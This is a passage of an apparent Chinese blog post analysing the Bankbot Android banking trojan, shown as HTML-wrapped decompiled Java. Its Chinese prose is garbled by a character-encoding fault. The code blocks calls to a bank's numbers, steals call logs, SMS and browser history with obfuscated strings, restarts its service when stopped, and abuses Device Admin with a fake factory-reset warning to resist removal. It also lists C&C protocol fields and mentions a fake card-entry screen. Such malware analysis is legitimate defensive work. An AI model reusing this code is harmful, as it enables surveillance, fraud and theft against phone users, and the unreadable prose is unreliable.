class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">    String[] v8;</span><br><span class="line">    <span class="type">String</span> <span class="variable">action</span> <span class="operator">=</span> intent.getAction();</span><br><span class="line">    <span class="type">String</span> <span class="variable">v6</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v3</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;incoming_number&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v5</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;android.intent.extra.PHONE_NUMBER&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="string">&quot;8005555550; 4955005550;&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">v10</span> <span class="operator">=</span> <span class="string">&quot;8005555550; 4955005550;&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">v11</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">v9</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(action.equals(<span class="string">&quot;android.intent.action.NEW_OUTGOING_CALL&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">v4</span> <span class="operator">=</span> v5.replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;#&quot;</span>, <span class="string">&quot;d&quot;</span>).replace(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;s&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(</span><br><span class="line">                <span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(v1 != <span class="literal">null</span>) &#123;</span><br><span class="line">            v8 = v1.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;;&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(v8.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">int</span> v13;</span><br><span class="line">                <span class="keyword">for</span>(v13 = <span class="number">0</span>; v13 &lt; v8.length; ++v13) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(v4.contains(v8[v13])) &#123;</span><br><span class="line">                        v9 = <span class="number">1</span>;</span><br><span class="line">                        v11 = String.valueOf(v11) + <span class="string">&quot;blocked outgoing call&quot;</span>;</span><br><span class="line">                        <span class="built_in">this</span>.setResultData(<span class="literal">null</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(v9 == <span class="number">0</span>) &#123;</span><br><span class="line">            v11 = String.valueOf(v11) + <span class="string">&quot;outgoing call&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ReportWithDataTask</span>(context, <span class="string">&quot;call_data&quot;</span>).execute(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;[&quot;</span> + <span class="built_in">this</span>.toJSON(v4, </span><br><span class="line">                v11) + <span class="string">&quot;]&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  ...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡ç½‘é¡µ <a href="http://www.sberbank.com/news-and-media/contacts">http://www.sberbank.com/news-and-media/contacts</a> ä¸­çš„ä¿¡æ¯æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼š</p><p>8005555550 4955005550 è¿™ä¸¤ä¸ªå·ç  sberbank çš„å·ç ï¼Œåœ¨ä¿„ç½—æ–¯æ‹¨æ‰“å…è´¹ã€‚</p><h3 id="ç¦æ­¢æ¥å¬æŒ‡å®šå·ç ç”µè¯"><a href="#ç¦æ­¢æ¥å¬æŒ‡å®šå·ç ç”µè¯" class="headerlink" title="ç¦æ­¢æ¥å¬æŒ‡å®šå·ç ç”µè¯"></a>ç¦æ­¢æ¥å¬æŒ‡å®šå·ç ç”µè¯</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">v10</span> <span class="operator">=</span> <span class="string">&quot;8005555550; 4955005550;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((action.equals(<span class="string">&quot;android.intent.action.PHONE_STATE&quot;</span>)) &amp;&amp; (v6.equals(<span class="string">&quot;RINGING&quot;</span>))) &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">v2</span> <span class="operator">=</span> v3 != <span class="literal">null</span> ? v3.replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;#&quot;</span>, <span class="string">&quot;d&quot;</span>).replace(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;s&quot;</span>).replace(</span><br><span class="line">        <span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>) : <span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(v10 != <span class="literal">null</span>) &#123;</span><br><span class="line">    v8 = v10.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(v13 = <span class="number">0</span>; v13 &lt; v8.length; ++v13) &#123;</span><br><span class="line">        <span class="keyword">if</span>(v2.contains(v8[v13])) &#123;</span><br><span class="line">            v11 = <span class="string">&quot;blocked incoming call&quot;</span>;</span><br><span class="line">            v9 = <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">this</span>.hangUp(context);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!v2.contains(<span class="string">&quot;Unknown&quot;</span>)) &#123;</span><br><span class="line">        goto label_106;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v11 = <span class="string">&quot;blocked incoming call&quot;</span>;</span><br><span class="line">    v9 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">this</span>.hangUp(context);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">label_106:</span><br><span class="line"><span class="keyword">if</span>(v9 == <span class="number">0</span>) &#123;</span><br><span class="line">    v11 = <span class="string">&quot;incoming call&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ReportWithDataTask</span>(context, <span class="string">&quot;call_data&quot;</span>).execute(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;[&quot;</span> + <span class="built_in">this</span>.toJSON(v2, </span><br><span class="line">        v11) + <span class="string">&quot;]&quot;</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="éšç§çªƒå–"><a href="#éšç§çªƒå–" class="headerlink" title="éšç§çªƒå–"></a>éšç§çªƒå–</h3><h4 id="è·å–ç”µè¯æ‹¨æ‰“è®°å½•"><a href="#è·å–ç”µè¯æ‹¨æ‰“è®°å½•" class="headerlink" title="è·å–ç”µè¯æ‹¨æ‰“è®°å½•"></a>è·å–ç”µè¯æ‹¨æ‰“è®°å½•</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> StringBuilder <span class="title function_">getCallLog</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">v20</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v18</span> <span class="operator">=</span> <span class="string">&quot;O||U|T||||G|O|||I|N||G|&quot;</span>.replace(<span class="string">&quot;|&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="type">Cursor</span> <span class="variable">v10</span> <span class="operator">=</span> <span class="built_in">this</span>.context.getContentResolver().query(CallLog$Calls.CONTENT_URI, <span class="literal">null</span>, <span class="literal">null</span>, </span><br><span class="line">            <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v15</span> <span class="operator">=</span> <span class="string">&quot;I++N+C+O+++M+I++N+G+&quot;</span>.replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v16</span> <span class="operator">=</span> <span class="string">&quot;M-I--S--S---E--D---&quot;</span>.replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v22</span> <span class="operator">=</span> <span class="string">&quot;***&#123;\&quot;n*u**mb**e*r\&quot;***:%s,\&quot;da****te\&quot;:%s,\&quot;d*u*ra****ti*o***n\&quot;:%s,\&quot;t*yp***e\&quot;:%s&#125;*&quot;</span></span><br><span class="line">            .replace(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((v10.moveToFirst()) &amp;&amp; v10.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">v17</span> <span class="operator">=</span> v10.getColumnIndex(<span class="string">&quot;number&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">v21</span> <span class="operator">=</span> v10.getColumnIndex(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">v11</span> <span class="operator">=</span> v10.getColumnIndex(<span class="string">&quot;date&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">v14</span> <span class="operator">=</span> v10.getColumnIndex(<span class="string">&quot;duration&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(!v10.isAfterLast()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">v19</span> <span class="operator">=</span> v10.getString(v17);</span><br><span class="line">            <span class="type">String</span> <span class="variable">v9</span> <span class="operator">=</span> v10.getString(v21);</span><br><span class="line">            <span class="type">String</span> <span class="variable">v7</span> <span class="operator">=</span> v10.getString(v11);</span><br><span class="line">            <span class="type">String</span> <span class="variable">v8</span> <span class="operator">=</span> v10.getString(v14);</span><br><span class="line">            <span class="type">String</span> <span class="variable">v13</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">switch</span>(Integer.parseInt(v9)) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                    v13 = v15;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">                    v13 = v18;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>: &#123;</span><br><span class="line">                    v13 = v16;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v20.append(String.format(Locale.US, v22, JSONObject.quote(v19), JSONObject.quote(</span><br><span class="line">                    v7), JSONObject.quote(v8), JSONObject.quote(v13)));</span><br><span class="line">            <span class="keyword">if</span>(!v10.isLast()) &#123;</span><br><span class="line">                v20.append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v10.moveToNext();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v10.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v20.append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è·å–çŸ­ä¿¡è®°å½•"><a href="#è·å–çŸ­ä¿¡è®°å½•" class="headerlink" title="è·å–çŸ­ä¿¡è®°å½•"></a>è·å–çŸ­ä¿¡è®°å½•</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> StringBuilder <span class="title function_">getSmsLog</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">v10</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="type">Cursor</span> <span class="variable">v8</span> <span class="operator">=</span> <span class="built_in">this</span>.context.getContentResolver().query(Uri.parse(<span class="string">&quot;content://ABC&quot;</span>.replace(<span class="string">&quot;A&quot;</span>, </span><br><span class="line">            <span class="string">&quot;s&quot;</span>).replace(<span class="string">&quot;B&quot;</span>, <span class="string">&quot;m&quot;</span>).replace(<span class="string">&quot;C&quot;</span>, <span class="string">&quot;s&quot;</span>)), <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span>((v8.moveToFirst()) &amp;&amp; v8.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(!v8.isAfterLast()) &#123;</span><br><span class="line">            v10.append(String.format(Locale.US, <span class="string">&quot;&#123;\&quot;address\&quot;:%s,\&quot;body\&quot;:%s,\&quot;date\&quot;:%s&#125;&quot;</span>, </span><br><span class="line">                    JSONObject.quote(v8.getString(v8.getColumnIndex(<span class="string">&quot;address&quot;</span>))), JSONObject</span><br><span class="line">                    .quote(v8.getString(v8.getColumnIndex(<span class="string">&quot;body&quot;</span>))), JSONObject.quote(v8.getString(</span><br><span class="line">                    v8.getColumnIndex(<span class="string">&quot;date&quot;</span>)))));</span><br><span class="line">            <span class="keyword">if</span>(!v8.isLast()) &#123;</span><br><span class="line">                v10.append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v8.moveToNext();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v8.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v10.append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æµè§ˆå™¨ä¹¦ç­¾"><a href="#æµè§ˆå™¨ä¹¦ç­¾" class="headerlink" title="æµè§ˆå™¨ä¹¦ç­¾"></a>æµè§ˆå™¨ä¹¦ç­¾</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> StringBuilder <span class="title function_">getHistory</span><span class="params">(Uri historyUri)</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">v8</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="type">Cursor</span> <span class="variable">v6</span> <span class="operator">=</span> <span class="built_in">this</span>.context.getContentResolver().query(historyUri, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;title&quot;</span>, <span class="string">&quot;url&quot;</span>, </span><br><span class="line">            <span class="string">&quot;date&quot;</span>&#125;, <span class="string">&quot;bookmark = 0&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span>((v6.moveToFirst()) &amp;&amp; v6.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(!v6.isAfterLast()) &#123;</span><br><span class="line">            v8.append(String.format(Locale.US, <span class="string">&quot;&#123;\&quot;title\&quot;:%s,\&quot;url\&quot;:%s,\&quot;date\&quot;:%s&#125;&quot;</span>, JSONObject</span><br><span class="line">                    .quote(v6.getString(v6.getColumnIndex(<span class="string">&quot;title&quot;</span>))), JSONObject.quote(v6.getString(</span><br><span class="line">                    v6.getColumnIndex(<span class="string">&quot;url&quot;</span>))), JSONObject.quote(v6.getString(v6.getColumnIndex(</span><br><span class="line">                    <span class="string">&quot;date&quot;</span>)))));</span><br><span class="line">            <span class="keyword">if</span>(!v6.isLast()) &#123;</span><br><span class="line">                v8.append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v6.moveToNext();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v6.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v8.append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="éª—å–ä¿¡ç”¨å¡ä¿¡æ¯"><a href="#éª—å–ä¿¡ç”¨å¡ä¿¡æ¯" class="headerlink" title="éª—å–ä¿¡ç”¨å¡ä¿¡æ¯"></a>éª—å–ä¿¡ç”¨å¡ä¿¡æ¯</h2><p>å½“ç”¨æˆ·æ‰“å¼€Google Play åº”ç”¨æ—¶ï¼Œæ‰“å¼€ä¼ªé€ çš„Activityï¼Œè¯±ä½¿ç”¨æˆ·è¾“å…¥ä¿¡ç”¨å¡ä¿¡æ¯ã€‚</p><h2 id="é«˜çº§æŠ€æœ¯"><a href="#é«˜çº§æŠ€æœ¯" class="headerlink" title="é«˜çº§æŠ€æœ¯"></a>é«˜çº§æŠ€æœ¯</h2><h3 id="ä¸æ–­é‡å¯çš„Servcie"><a href="#ä¸æ–­é‡å¯çš„Servcie" class="headerlink" title="ä¸æ–­é‡å¯çš„Servcie"></a>ä¸æ–­é‡å¯çš„Servcie</h3><p>com.android.smali3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onDestroy();</span><br><span class="line">    <span class="built_in">this</span>.startService(<span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>.getApplicationContext(), smali3.class));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœåŠ¡è¢«åœæ­¢ï¼Œç«‹å³é‡å¯ï¼Œæ— æ³•åœæ­¢ã€‚</p><h3 id="é˜²æ­¢å¸è½½"><a href="#é˜²æ­¢å¸è½½" class="headerlink" title="é˜²æ­¢å¸è½½"></a>é˜²æ­¢å¸è½½</h3><p>Bankbot ç”³è¯· Device Admin æƒé™ï¼Œæ— æ³•è¢«æ­£å¸¸å¸è½½ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; adb shell pm uninstall com.android.market</span><br><span class="line">Failure</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ç¦æ­¢åˆ é™¤-Device-Admin-æƒé™"><a href="#ç¦æ­¢åˆ é™¤-Device-Admin-æƒé™" class="headerlink" title="ç¦æ­¢åˆ é™¤ Device Admin æƒé™"></a>ç¦æ­¢åˆ é™¤ Device Admin æƒé™</h3><p>è¿™ä¸ªä¸€ä¸ªéå¸¸æµæ°“çš„åšæ³•ï¼Œå…·ä½“çš„åšæ³•æ˜¯å¦‚ä¸‹é¢çš„ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdRec</span> <span class="keyword">extends</span> <span class="title class_">DeviceAdminReceiver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AdRec</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> CharSequence <span class="title function_">onDisableRequested</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">AppCrash</span>().Register(context);</span><br><span class="line">        <span class="keyword">if</span>(Build$VERSION.SDK_INT &lt;= <span class="number">0xA</span>) &#123;</span><br><span class="line">            <span class="type">Intent</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.settings.SETTINGS&quot;</span>);</span><br><span class="line">            v2.setFlags(<span class="number">0x50000000</span>);</span><br><span class="line">            context.startActivity(v2);</span><br><span class="line">            <span class="type">Intent</span> <span class="variable">v4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.intent.action.MAIN&quot;</span>);</span><br><span class="line">            v4.addCategory(<span class="string">&quot;android.intent.category.HOME&quot;</span>);</span><br><span class="line">            v4.setFlags(<span class="number">0x10000000</span>);</span><br><span class="line">            context.startActivity(v4);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;WARNING! Your device will now reboot to factory settings.\n\nClick \&quot;Yes\&quot; to erase your data and continue. \&quot;No\&quot; for cancel.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        context.startService(<span class="keyword">new</span> <span class="title class_">Intent</span>(context, ASec.class));</span><br><span class="line">        <span class="type">long</span> <span class="variable">v6</span> <span class="operator">=</span> <span class="number">0x7D0</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(v6);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(InterruptedException v3) &#123;</span><br><span class="line">            v3.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WARNING! Your device will now reboot to factory settings.\n\nClick \&quot;Yes\&quot; to erase your data and continue. \&quot;No\&quot; for cancel.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡å†™ DeviceAdminReceiver çš„ onDisableRequest æ–¹æ³•ã€‚ä½¿ç”¨ Thread.sleep æ–¹æ³•ä½¿ç”¨æˆ·<br>æ— æ³•æ“ä½œç•Œé¢ï¼Œåœ¨æ­¤æœŸé—´é‡‡å– Activity åˆ‡æ¢çš„æ–¹æ³•ç»•å¼€å–æ¶ˆæ¿€æ´»çš„æ­¥éª¤ã€‚</p><p>è¿™é‡Œå‡ºè¿‡å‡ ä¸ªé—®é¢˜ï¼Œ</p><ol><li>Backdoor.AndroidOS.Obad.a ä½¿ç”¨çš„ï¼Œåœ¨è®¾å¤‡ç®¡ç†å™¨ä¸­éšèº«</li><li>å°±æ˜¯ç°åœ¨ä»£ç ä¸­æ‰€ç”¨åˆ°è¿™ä¸ªï¼Œç›®å‰åœ¨æ‰€æœ‰çš„Android ç‰ˆæœ¬ä¸­å­˜åœ¨ã€‚</li></ol><h3 id="ç•Œé¢åŠ«æŒ"><a href="#ç•Œé¢åŠ«æŒ" class="headerlink" title="ç•Œé¢åŠ«æŒ"></a>ç•Œé¢åŠ«æŒ</h3><p>é€šè¿‡ç•Œé¢åŠ«æŒï¼Œè¯±ä½¿ç”¨æˆ·å°†Appè®¾ç½®ä¸ºè®¾å¤‡ç®¡ç†å™¨ã€‚ä»ä¸‹å›¾ä¸­å¯ä»¥çœ‹è§ContinuesæŒ‰é’®å…¶å®<br>æ˜¯è®¾å¤‡ç®¡ç†å™¨çš„æ¿€æ´»æŒ‰é’®ã€‚</p><h2 id="ä½¿ç”¨ç¿ é¸Ÿå¯¹æ¶æ„æ ·æœ¬è¿›è¡Œæ£€æŸ¥çš„ç»“æœ"><a href="#ä½¿ç”¨ç¿ é¸Ÿå¯¹æ¶æ„æ ·æœ¬è¿›è¡Œæ£€æŸ¥çš„ç»“æœ" class="headerlink" title="ä½¿ç”¨ç¿ é¸Ÿå¯¹æ¶æ„æ ·æœ¬è¿›è¡Œæ£€æŸ¥çš„ç»“æœ"></a>ä½¿ç”¨ç¿ é¸Ÿå¯¹æ¶æ„æ ·æœ¬è¿›è¡Œæ£€æŸ¥çš„ç»“æœ</h2><h2 id="0x02-C-amp-C-åè®®åˆ†æ"><a href="#0x02-C-amp-C-åè®®åˆ†æ" class="headerlink" title="0x02 C&amp;C åè®®åˆ†æ"></a>0x02 C&amp;C åè®®åˆ†æ</h2><p>Bankbot ä»¥å›ºå®šæ—¶é—´è½®è¯¢çš„æ–¹å¼å‘C&amp;CæœåŠ¡å™¨è¯·æ±‚å‘½ä»¤ï¼Œå‘½ä»¤çš„æ ¼å¼ä¸ºjsonæ ¼å¼ã€‚ä»ä»£ç ä¸­<br>å¯ä»¥å¾—åˆ°jsonå­—æ®µçš„ä¿¡æ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_ACTION</span> <span class="operator">=</span> <span class="string">&quot;action&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_CALL_LOG</span> <span class="operator">=</span> <span class="string">&quot;call_log&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_DATA</span> <span 